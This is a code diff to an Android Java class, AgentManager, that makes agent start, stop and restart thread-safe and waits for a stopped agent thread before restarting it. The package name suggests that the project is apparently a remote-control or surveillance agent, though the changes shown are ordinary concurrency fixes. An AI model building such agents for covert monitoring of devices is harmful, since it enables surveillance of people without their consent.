@@ -16,6 +16,8 @@ import com.ht.RCSAndroidGUI.Status;
 import android.util.Log;
 
 public class AgentManager {
+	private static final String TAG = "AgentManager";
+	
 	private volatile static AgentManager singleton;
 	private Status statusObj;
 	
@@ -165,7 +167,7 @@ public class AgentManager {
 		}	
 	}
 	
-	public void startAgent(int key) {
+	public synchronized void startAgent(int key) {
 		HashMap<Integer, Agent> agents;
 		
 		agents = statusObj.getAgentsMap();
@@ -204,7 +206,7 @@ public class AgentManager {
 		}
 	}
 	
-	public void stopAgent(int key) {
+	public synchronized void stopAgent(int key) {
 		AgentBase a = running.get(key);
 		
 		if (a == null) {
@@ -215,8 +217,14 @@ public class AgentManager {
 		a.stopThread();
 	}
 
-	public void restartAgent(int key) {
+	public synchronized void restartAgent(int key) {
+		AgentBase a = running.get(key);
 		stopAgent(key);
+		try {
+			a.join();
+		} catch (InterruptedException e) {
+			Log.e(TAG,e.toString());
+		}
 		startAgent(key);
 	}
 }
